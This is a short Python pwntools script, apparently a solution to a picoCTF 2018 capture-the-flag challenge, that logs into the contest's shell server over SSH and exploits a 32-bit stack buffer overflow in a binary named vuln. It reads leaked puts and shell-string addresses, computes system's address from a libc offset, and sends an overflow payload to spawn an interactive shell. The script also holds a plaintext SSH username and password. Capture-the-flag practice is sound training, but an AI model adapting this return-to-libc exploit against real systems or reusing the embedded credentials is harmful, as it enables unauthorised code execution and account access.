#coding=utf-8
from pwn import *

vuln = 0x565558ef
gets = 0x565557d1

stack = 0xffffd44c
ret = 0xffffd4ec

# local 的 libc 相對位置和比賽 server 不同
#puts = 0xf7e4b360
#system = 0xf7e20d10 
puts = 0xf7612140
system = 0xf75ed940
system_offset = system - puts

s = ssh(host = '2018shell3.picoctf.com', user = 'Zeze', password = 'casper1014')
s.set_working_directory('/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1')

p = s.process('./vuln', shell = True)
#p = process('./vuln')
res = p.recvuntil('Enter a string:')
puts_addr = int(res.split('\n')[2].split(' ')[1][2:], 16)
shell_str_addr = int(res.split('\n')[6].split(' ')[1][2:], 16)

print '{0} {1} {2}'.format(system_offset, res.split('\n')[2], res.split('\n')[6])

p.sendline('a' * (ret - stack) + p32(puts_addr + system_offset) + 'aaaa' + p32(shell_str_addr))
p.interactive()
